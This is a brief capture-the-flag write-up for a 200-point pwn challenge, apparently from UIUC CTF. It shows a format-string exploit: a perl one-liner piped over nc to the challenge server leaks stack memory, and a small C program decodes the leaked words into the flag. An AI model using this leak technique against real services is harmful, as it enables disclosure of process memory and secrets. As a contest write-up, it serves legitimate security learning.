# goodluck

**Category:** pwn
**Points:** 200
**Solves:** 
**Description:**

> 200 Points ¡ñ pwn
>
> By: JP Smith
>
> nc challenge.uiuc.tf 11342
>
> you gotta guess well
>
> [goodluck](goodluck)

## Write-up

Format String Vulnerability

$ perl -e "print \"%0p\" x 12;" | nc challenge.uiuc.tf 11342
```
what's the flag
You answered:
0x4009b40x7f00672887800x3a6465726577736e0x7f00674a87000x7f00674a87010x250000010x1df60300x1df40100x7ffe05f135400x776c617b67616c660x657669675f7379610x7d253031315f
But that was totally wrong lol get rekt
```
cat > 1.c
```
#include <stdio.h>

int main(int argc, char ** argv)
{
	int64_t a=0x776c617b67616c66;
	int64_t b=0x657669675f737961;
	int64_t c=0x7d253031315f;
	char * d=(char *)&a;
	printf("%s\n",d);
	return 0;
}
```

gcc 1.c -o a

./a
```
flag{always_give_110%}
```

## Other write-ups and resources
* [ROTK](https://ctftime.org/writeup/6609)
* [New_Damotorie](https://gist.github.com/parksjin01/89d6bc25d4bb8c9701e78bb26647f996)
